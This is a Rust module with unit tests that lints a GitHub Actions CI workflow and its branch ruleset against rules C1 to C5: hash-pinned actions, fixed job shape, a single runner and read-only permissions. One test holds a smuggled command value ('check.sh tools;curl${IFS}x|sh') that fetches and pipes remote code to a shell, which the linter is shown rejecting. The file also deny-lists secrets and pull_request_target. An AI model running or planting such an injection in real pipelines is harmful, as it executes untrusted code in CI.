//! CI definition guards C1 to C5 of spec 0002.

use std::collections::BTreeSet;

use crate::report::Report;
use crate::tree::Tree;

/// The workflow that runs the required checks.
pub const CI: &str = ".github/workflows/ci.yml";

/// The branch rule for `main`.
pub const RULESET: &str = ".github/rulesets/main.json";

/// The directory of workflow files.
pub const WORKFLOWS: &str = ".github/workflows";

/// The only runner label the workflow may use.
pub const RUNNER: &str = "ubuntu-24.04-arm";

/// Runs rules C1 to C5.
pub fn check(tree: &dyn Tree) -> Report {
    let mut report = Report::default();
    let workflows: Vec<(String, String)> = report
        .walk(tree, WORKFLOWS, &|_| false)
        .into_iter()
        .filter_map(|path| report.need(tree, &path).map(|text| (path, text)))
        .collect();
    let ci = report.need(tree, CI);
    let ruleset = report.need(tree, RULESET);
    for (path, text) in &workflows {
        if path != CI {
            report.add(
                "C5",
                path,
                format!("{WORKFLOWS}/ holds a workflow other than {CI}"),
            );
        }
        pinned_actions(path, text, &mut report);
        forbidden_text(path, text, &mut report);
    }
    if let Some(ci) = &ci {
        if let Some(ruleset) = &ruleset {
            jobs_match_checks(ci, ruleset, &mut report);
        }
        shape(ci, &mut report);
        runners(ci, &mut report);
        permissions(ci, &mut report);
    }
    report
}

/// Returns the value of `key:` on a line, after an optional list dash, or `None` when the line is another key or a comment.
fn value_of<'a>(line: &'a str, key: &str) -> Option<&'a str> {
    let rest = line.trim_start();
    let rest = rest.strip_prefix("- ").map_or(rest, str::trim_start);
    rest.strip_prefix(key)?.strip_prefix(':').map(str::trim)
}

fn is_pinned(reference: &str) -> bool {
    let Some((action, hash)) = reference.split_once('@') else {
        return false;
    };
    let Some((owner, name)) = action.split_once('/') else {
        return false;
    };
    let part = |s: &str| {
        !s.is_empty()
            && s.chars()
                .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'))
    };
    part(owner) && part(name) && hash.len() == 40 && hash.chars().all(|c| c.is_ascii_hexdigit())
}

fn pinned_actions(path: &str, text: &str, report: &mut Report) {
    for (index, line) in text.lines().enumerate() {
        let Some(value) = value_of(line, "uses") else {
            continue;
        };
        let (reference, comment) = value.split_once(' ').unwrap_or((value, ""));
        if !is_pinned(reference) || !comment.trim_start().starts_with("# v") {
            report.add_at(
                "C1",
                path,
                index + 1,
                format!("uses {reference} is not <owner>/<name>@<40 hexadecimal characters> followed by a comment that starts with # v"),
            );
        }
    }
}

fn forbidden_text(path: &str, text: &str, report: &mut Report) {
    for (index, line) in text.lines().enumerate() {
        for word in ["pull_request_target", "secrets"] {
            if line.contains(word) {
                report.add_at(
                    "C5",
                    path,
                    index + 1,
                    format!("the workflow contains the text {word}"),
                );
            }
        }
    }
}

/// Returns the job id of a job id line: two spaces, an id of letters, digits, hyphens and underscores, a colon, and nothing else.
fn job_id_of(line: &str) -> Option<&str> {
    let id = line.trim_end().strip_prefix("  ")?.strip_suffix(':')?;
    let valid = !id.is_empty()
        && id
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_'));
    valid.then_some(id)
}

/// Returns the job ids of a workflow with their line numbers: job id lines anywhere after the `jobs:` line.
pub fn job_ids(ci: &str) -> Vec<(usize, String)> {
    let mut ids = Vec::new();
    let mut in_jobs = false;
    for (index, line) in ci.lines().enumerate() {
        if line.trim_end() == "jobs:" {
            in_jobs = true;
            continue;
        }
        if in_jobs && let Some(id) = job_id_of(line) {
            ids.push((index + 1, id.to_string()));
        }
    }
    ids
}

/// The key of a line, found as rule C3 says: leading spaces dropped, one leading `- ` dropped, the text before the first colon. `None` when the line has no colon.
fn key_of(line: &str) -> Option<(&str, &str)> {
    let rest = line.trim_start_matches(' ');
    let rest = rest.strip_prefix("- ").unwrap_or(rest);
    rest.split_once(':')
}

/// The keys that may appear after `jobs:` (rule C3).
pub const ALLOWED_KEYS: [&str; 10] = [
    "runs-on",
    "timeout-minutes",
    "steps",
    "uses",
    "with",
    "persist-credentials",
    "fetch-depth",
    "path",
    "key",
    "run",
];

/// One line after `jobs:`, with the job it belongs to.
struct JobLine<'a> {
    number: usize,
    job: Option<&'a str>,
    text: &'a str,
}

fn job_lines(ci: &str) -> Option<Vec<JobLine<'_>>> {
    let lines: Vec<&str> = ci.lines().collect();
    let start = lines.iter().position(|line| line.trim_end() == "jobs:")?;
    let mut job = None;
    let mut out = Vec::new();
    for (index, text) in lines.iter().enumerate().skip(start + 1) {
        if let Some(id) = job_id_of(text) {
            job = Some(id);
        }
        out.push(JobLine {
            number: index + 1,
            job,
            text,
        });
    }
    Some(out)
}

fn job_name(job: Option<&str>) -> &str {
    job.unwrap_or("(before the first job)")
}

/// Rule C3: the fixed shape after `jobs:`.
fn shape(ci: &str, report: &mut Report) {
    let Some(lines) = job_lines(ci) else {
        report.add("C3", CI, "the workflow has no jobs: line");
        return;
    };
    let mut names: BTreeSet<String> = job_ids(ci).into_iter().map(|(_, id)| id).collect();
    names.insert("tools".to_string());
    // Spec 0004: the fuzz job installs its tools with this name.
    names.insert("fuzz-tools".to_string());
    let mut last_run: Vec<(&str, usize, String)> = Vec::new();
    for (at, line) in lines.iter().enumerate() {
        let text = line.text;
        if text.trim().is_empty() || job_id_of(text).is_some() {
            continue;
        }
        let id = job_name(line.job);
        if text.trim_start().starts_with('#') {
            report.add_at(
                "C3",
                CI,
                line.number,
                format!("job {id}: a comment line is not part of the fixed shape"),
            );
            continue;
        }
        let Some((key, value)) = key_of(text) else {
            report.add_at(
                "C3",
                CI,
                line.number,
                format!("job {id}: the line has no key"),
            );
            continue;
        };
        if !ALLOWED_KEYS.contains(&key) {
            report.add_at(
                "C3",
                CI,
                line.number,
                format!("job {id}: the key {key} is not on the allowed list of rule C3"),
            );
            continue;
        }
        if key != "run" {
            continue;
        }
        let value = value.trim();
        let allowed = value == "rustup toolchain install"
            || value
                .strip_prefix("scripts/check.sh ")
                .is_some_and(|name| names.contains(name));
        if !allowed {
            report.add_at(
                "C3",
                CI,
                line.number,
                format!("job {id} runs {value}, which is neither rustup toolchain install nor scripts/check.sh <a job id or tools>"),
            );
        }
        let indent = text.len() - text.trim_start_matches(' ').len();
        if let Some(next) = lines[at + 1..].iter().find(|l| !l.text.trim().is_empty()) {
            let new_step = next.text.len() - next.text.trim_start_matches(' ').len() == indent
                && next.text.trim_start_matches(' ').starts_with("- ");
            if !(new_step || job_id_of(next.text).is_some()) {
                report.add_at(
                    "C3",
                    CI,
                    next.number,
                    format!(
                        "job {id}: the run: step of line {} goes on here; a run: step is one line",
                        line.number
                    ),
                );
            }
        }
        match last_run.iter_mut().find(|(job, _, _)| *job == id) {
            Some(entry) => {
                entry.1 = line.number;
                entry.2 = value.to_string();
            }
            None => last_run.push((id, line.number, value.to_string())),
        }
    }
    for (line, id) in job_ids(ci) {
        let wanted = format!("scripts/check.sh {id}");
        match last_run.iter().find(|(job, _, _)| *job == id) {
            Some((_, _, value)) if *value == wanted => {}
            Some((_, at, value)) => report.add_at(
                "C3",
                CI,
                *at,
                format!("job {id}: the last run is {value}, not {wanted}"),
            ),
            None => report.add_at("C3", CI, line, format!("job {id} has no run step {wanted}")),
        }
    }
}

/// Rule C4: every job has exactly one `runs-on:` line with the one runner label.
fn runners(ci: &str, report: &mut Report) {
    let Some(lines) = job_lines(ci) else {
        return;
    };
    for (line, id) in job_ids(ci) {
        let found: Vec<(usize, &str)> = lines
            .iter()
            .filter(|l| l.job == Some(id.as_str()) && !l.text.trim_start().starts_with('#'))
            .filter_map(|l| match key_of(l.text) {
                Some(("runs-on", value)) => Some((l.number, value.trim())),
                _ => None,
            })
            .collect();
        match found.as_slice() {
            [] => report.add_at("C4", CI, line, format!("job {id} has no runs-on: line")),
            [(at, value)] if *value != RUNNER => report.add_at(
                "C4",
                CI,
                *at,
                format!("job {id}: runs-on is {value}, not {RUNNER}"),
            ),
            [_] => {}
            [_, (at, _), ..] => report.add_at(
                "C4",
                CI,
                *at,
                format!("job {id} has {} runs-on: lines, not one", found.len()),
            ),
        }
    }
}

/// Rule C5: one top level `permissions:` line whose block is the one line `  contents: read`.
fn permissions(ci: &str, report: &mut Report) {
    let lines: Vec<&str> = ci.lines().collect();
    let found: Vec<usize> = lines
        .iter()
        .enumerate()
        .filter(|(_, line)| matches!(key_of(line), Some(("permissions", _))))
        .map(|(index, _)| index)
        .collect();
    let [at] = found.as_slice() else {
        report.add(
            "C5",
            CI,
            format!(
                "the workflow has {} lines whose key is permissions, not one",
                found.len()
            ),
        );
        return;
    };
    let at = *at;
    if lines[at].trim_end() != "permissions:" {
        report.add_at(
            "C5",
            CI,
            at + 1,
            "the permissions line must be permissions: at the start of a line with nothing after it",
        );
        return;
    }
    let block: Vec<(usize, &str)> = lines
        .iter()
        .enumerate()
        .skip(at + 1)
        .take_while(|(_, line)| line.is_empty() || line.starts_with(' '))
        .map(|(index, line)| (index, *line))
        .collect();
    let mut reads = 0;
    for (index, line) in &block {
        if line.trim().is_empty() {
            continue;
        }
        if line.trim_end() == "  contents: read" {
            reads += 1;
        } else {
            report.add_at(
                "C5",
                CI,
                index + 1,
                format!(
                    "the permissions block holds {}, only   contents: read is allowed",
                    line.trim()
                ),
            );
        }
    }
    if reads != 1 {
        report.add_at(
            "C5",
            CI,
            at + 1,
            "the permissions block must be the one line   contents: read",
        );
    }
}

/// Returns the `"context"` values of the ruleset.
pub fn contexts(ruleset: &str) -> Vec<String> {
    let mut out = Vec::new();
    for piece in ruleset.split("\"context\"").skip(1) {
        let rest = piece.trim_start();
        let Some(rest) = rest.strip_prefix(':') else {
            continue;
        };
        let mut quoted = rest.trim_start().split('"');
        if quoted.next() == Some("")
            && let Some(value) = quoted.next()
        {
            out.push(value.to_string());
        }
    }
    out
}

fn jobs_match_checks(ci: &str, ruleset: &str, report: &mut Report) {
    let jobs = job_ids(ci);
    let checks: BTreeSet<String> = contexts(ruleset).into_iter().collect();
    let ids: BTreeSet<&str> = jobs.iter().map(|(_, id)| id.as_str()).collect();
    for (line, id) in &jobs {
        if !checks.contains(id) {
            report.add_at(
                "C2",
                CI,
                *line,
                format!("job {id} is not a required check in {RULESET}"),
            );
        }
    }
    for check in &checks {
        if !ids.contains(check.as_str()) {
            report.add(
                "C2",
                RULESET,
                format!("required check {check} is not a job id of {CI}"),
            );
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::tree::MemTree;

    const HASH: &str = "3d3c42e5aac5ba805825da76410c181273ba90b1";

    fn job(id: &str, extra: &str) -> String {
        format!(
            "  {id}:\n    runs-on: ubuntu-24.04-arm\n    timeout-minutes: 15\n    steps:\n      - uses: actions/checkout@{HASH} # v7.0.1\n        with:\n          persist-credentials: false\n      - run: rustup toolchain install\n{extra}      - run: scripts/check.sh {id}\n"
        )
    }

    fn workflow(ids: &[&str]) -> String {
        let jobs: Vec<String> = ids.iter().map(|id| job(id, "")).collect();
        format!(
            "name: ci\n\non:\n  pull_request:\n  push:\n    branches: [main]\n\npermissions:\n  contents: read\n\nconcurrency:\n  group: ci-${{{{ github.ref }}}}\n\nenv:\n  CARGO_TERM_COLOR: never\n\njobs:\n{}",
            jobs.join("\n")
        )
    }

    fn ruleset(ids: &[&str]) -> String {
        let checks: Vec<String> = ids
            .iter()
            .map(|id| format!("          {{ \"context\": \"{id}\", \"integration_id\": 15368 }}"))
            .collect();
        format!(
            "{{\n  \"rules\": [\n    {{\n      \"type\": \"required_status_checks\",\n      \"parameters\": {{\n        \"required_status_checks\": [\n{}\n        ]\n      }}\n    }}\n  ]\n}}\n",
            checks.join(",\n")
        )
    }

    fn good() -> MemTree {
        MemTree::of(&[
            (CI, &workflow(&["fmt", "deny", "docs"])),
            (RULESET, &ruleset(&["fmt", "deny", "docs"])),
        ])
    }

    fn assert_ok(tree: &MemTree) {
        let report = check(tree);
        assert!(
            report.problems.is_empty() && report.faults.is_empty(),
            "{}",
            report.dump()
        );
    }

    fn assert_problem(tree: &MemTree, rule: &str, texts: &[&str]) {
        let report = check(tree);
        assert!(
            report.has(rule, texts),
            "expected {rule} {texts:?}, got:\n{}",
            report.dump()
        );
    }

    #[test]
    fn good_definition_passes() {
        assert_ok(&good());
    }

    #[test]
    fn job_ids_ignore_keys_before_jobs() {
        let ids: Vec<String> = job_ids(&workflow(&["fmt"]))
            .into_iter()
            .map(|(_, id)| id)
            .collect();
        assert_eq!(ids, vec!["fmt"]);
    }

    #[test]
    fn missing_files_are_faults() {
        let report = check(&MemTree::default());
        assert!(report.faults.iter().any(|f| f.contains(CI)));
        assert!(report.faults.iter().any(|f| f.contains(RULESET)));
    }

    #[test]
    fn c1_tag_instead_of_hash() {
        let mut tree = good();
        tree.replace(
            CI,
            &format!("actions/checkout@{HASH}"),
            "actions/checkout@v7",
        );
        assert_problem(&tree, "C1", &[CI, "actions/checkout@v7"]);
    }

    #[test]
    fn c1_hash_without_version_comment() {
        let mut tree = good();
        tree.replace(CI, " # v7.0.1", "");
        assert_problem(&tree, "C1", &[CI]);
    }

    #[test]
    fn c1_checks_every_workflow_file() {
        let mut tree = good();
        tree.set(
            ".github/workflows/other.yml",
            "jobs:\n  x:\n    steps:\n      - uses: ./local-action\n",
        );
        assert_problem(&tree, "C1", &[".github/workflows/other.yml:4"]);
    }

    #[test]
    fn c2_renamed_job() {
        let mut tree = good();
        tree.replace(CI, "  docs:", "  documents:");
        let report = check(&tree);
        assert!(report.has("C2", &[CI, "documents"]), "{}", report.dump());
        assert!(report.has("C2", &[RULESET, "docs"]), "{}", report.dump());
    }

    #[test]
    fn c3_logic_in_a_run_step() {
        let mut tree = good();
        tree.replace(
            CI,
            "      - run: scripts/check.sh deny\n",
            "      - run: cargo deny check\n      - run: scripts/check.sh deny\n",
        );
        assert_problem(&tree, "C3", &[CI, "deny", "cargo deny check"]);
    }

    #[test]
    fn c3_last_run_is_another_check() {
        let mut tree = good();
        tree.replace(
            CI,
            "      - run: scripts/check.sh fmt\n",
            "      - run: scripts/check.sh clippy\n",
        );
        assert_problem(&tree, "C3", &[CI, "job fmt", "scripts/check.sh fmt"]);
    }

    #[test]
    fn c3_multiline_run_is_refused() {
        let mut tree = good();
        tree.replace(
            CI,
            "      - run: scripts/check.sh docs\n",
            "      - run: |\n          cargo test\n      - run: scripts/check.sh docs\n",
        );
        assert_problem(&tree, "C3", &[CI, "docs", "|"]);
    }

    #[test]
    fn c3_job_without_run() {
        let ci = format!(
            "{}\n  extra:\n    runs-on: ubuntu-24.04-arm\n    steps:\n      - uses: actions/checkout@{HASH} # v7.0.1\n",
            workflow(&["fmt"])
        );
        let tree = MemTree::of(&[(CI, &ci), (RULESET, &ruleset(&["fmt", "extra"]))]);
        assert_problem(&tree, "C3", &[CI, "extra"]);
    }

    #[test]
    fn c4_other_runner() {
        let mut tree = good();
        tree.replace(CI, "runs-on: ubuntu-24.04-arm", "runs-on: ubuntu-24.04");
        assert_problem(&tree, "C4", &[CI, "ubuntu-24.04"]);
    }

    #[test]
    fn c5_write_permission() {
        let mut tree = good();
        tree.replace(CI, "  contents: read\n", "  contents: write\n");
        assert_problem(&tree, "C5", &[CI]);
    }

    #[test]
    fn c5_extra_permission() {
        let mut tree = good();
        tree.replace(
            CI,
            "  contents: read\n",
            "  contents: read\n  id-token: write\n",
        );
        assert_problem(&tree, "C5", &[CI]);
    }

    #[test]
    fn c5_job_level_permissions() {
        let mut tree = good();
        tree.replace(
            CI,
            "    timeout-minutes: 15\n",
            "    timeout-minutes: 15\n    permissions:\n      contents: write\n",
        );
        let report = check(&tree);
        assert!(
            report.has("C5", &[CI, "2 lines whose key is permissions"]),
            "{}",
            report.dump()
        );
        assert!(
            report.has("C3", &[CI, "job fmt", "permissions"]),
            "{}",
            report.dump()
        );
    }

    #[test]
    fn c5_secrets_and_target_trigger() {
        let mut tree = good();
        tree.replace(CI, "  pull_request:\n", "  pull_request_target:\n");
        assert_problem(&tree, "C5", &[CI, "pull_request_target"]);
        let mut tree = good();
        tree.replace(
            CI,
            "  CARGO_TERM_COLOR: never\n",
            "  CARGO_TERM_COLOR: never\n  T: ${{ secrets['T'] }}\n",
        );
        assert_problem(&tree, "C5", &[CI, "secrets"]);
    }

    #[test]
    fn c5_second_workflow_file() {
        let mut tree = good();
        tree.set(".github/workflows/release.yml", "name: release\n");
        assert_problem(
            &tree,
            "C5",
            &[".github/workflows/release.yml", "other than"],
        );
    }

    #[test]
    fn c5_block_after_a_blank_line_or_a_comment() {
        let mut tree = good();
        tree.replace(
            CI,
            "  contents: read\n",
            "  contents: read\n\n  id-token: write\n",
        );
        assert_problem(&tree, "C5", &[CI, "id-token: write"]);
        let mut tree = good();
        tree.replace(CI, "  contents: read\n", "  contents: read\n  # note\n");
        assert_problem(&tree, "C5", &[CI, "# note"]);
        let mut tree = good();
        tree.replace(
            CI,
            "permissions:\n  contents: read\n",
            "permissions: read-all\n",
        );
        assert_problem(&tree, "C5", &[CI, "nothing after it"]);
    }

    #[test]
    fn c3_keys_that_are_not_allowed() {
        for (from, to, key) in [
            (
                "    timeout-minutes: 15\n",
                "    continue-on-error: true\n",
                "continue-on-error",
            ),
            (
                "      - run: scripts/check.sh fmt\n",
                "      - if: false\n        run: scripts/check.sh fmt\n",
                "if",
            ),
            ("    steps:\n", "    env:\n      X: y\n    steps:\n", "env"),
            (
                "      - run: rustup toolchain install\n",
                "      - shell: bash\n        run: rustup toolchain install\n",
                "shell",
            ),
            ("    steps:\n", "    name: other\n    steps:\n", "name"),
        ] {
            let mut tree = good();
            tree.replace(CI, from, to);
            assert_problem(&tree, "C3", &[CI, "job fmt", &format!("the key {key} ")]);
        }
    }

    #[test]
    fn c3_key_spellings_comments_and_lines_without_a_key() {
        for (to, text) in [
            ("      - \"run\": scripts/check.sh fmt\n", "the key \"run\""),
            ("      - {run: scripts/check.sh fmt}\n", "the key {run"),
            ("      - run : scripts/check.sh fmt\n", "the key run "),
            (
                "      # a comment\n      - run: scripts/check.sh fmt\n",
                "comment",
            ),
            (
                "      - run: scripts/check.sh fmt\n      plain words\n",
                "no key",
            ),
        ] {
            let mut tree = good();
            tree.replace(CI, "      - run: scripts/check.sh fmt\n", to);
            assert_problem(&tree, "C3", &[CI, text]);
        }
    }

    #[test]
    fn c3_run_value_must_be_exact() {
        for value in [
            "scripts/check.sh fmt || true",
            "scripts/check.sh tools;curl${IFS}x|sh",
            "scripts/check.sh nonsense",
        ] {
            let mut tree = good();
            tree.replace(
                CI,
                "      - run: rustup toolchain install\n",
                &format!("      - run: {value}\n"),
            );
            assert_problem(&tree, "C3", &[CI, "job fmt", value]);
        }
        let mut tree = good();
        tree.replace(
            CI,
            "      - run: rustup toolchain install\n",
            "      - run: scripts/check.sh tools\n      - run: scripts/check.sh deny\n",
        );
        assert_ok(&tree);
    }

    #[test]
    fn c3_accepts_fuzz_tools_and_nothing_like_it() {
        // Spec 0004: the fuzz job installs its tools with scripts/check.sh fuzz-tools.
        let mut tree = good();
        tree.replace(
            CI,
            "      - run: rustup toolchain install\n",
            "      - run: scripts/check.sh fuzz-tools\n",
        );
        assert_ok(&tree);
        for value in [
            "scripts/check.sh fuzz-tool",
            "scripts/check.sh fuzz-tools-x",
            "scripts/check.sh fuzz_tools",
        ] {
            let mut tree = good();
            tree.replace(
                CI,
                "      - run: rustup toolchain install\n",
                &format!("      - run: {value}\n"),
            );
            assert_problem(&tree, "C3", &[CI, "job fmt", value]);
        }
    }

    #[test]
    fn c3_run_step_is_one_line() {
        let mut tree = good();
        tree.replace(
            CI,
            "      - run: scripts/check.sh fmt\n",
            "      - run: scripts/check.sh fmt\n        || true\n",
        );
        assert_problem(&tree, "C3", &[CI, "job fmt", "one line"]);
        let mut tree = good();
        tree.replace(
            CI,
            "      - run: rustup toolchain install\n",
            "      - run: rustup toolchain install\n\n        with:\n",
        );
        assert_problem(&tree, "C3", &[CI, "job fmt", "one line"]);
    }

    #[test]
    fn c4_missing_and_repeated_runs_on() {
        let mut tree = good();
        tree.replace(CI, "  fmt:\n    runs-on: ubuntu-24.04-arm\n", "  fmt:\n");
        assert_problem(&tree, "C4", &[CI, "job fmt has no runs-on"]);
        let mut tree = good();
        tree.replace(
            CI,
            "  fmt:\n    runs-on: ubuntu-24.04-arm\n",
            "  fmt:\n    runs-on: ubuntu-24.04-arm\n    runs-on: ubuntu-24.04-arm\n",
        );
        assert_problem(&tree, "C4", &[CI, "job fmt has 2 runs-on"]);
    }
}
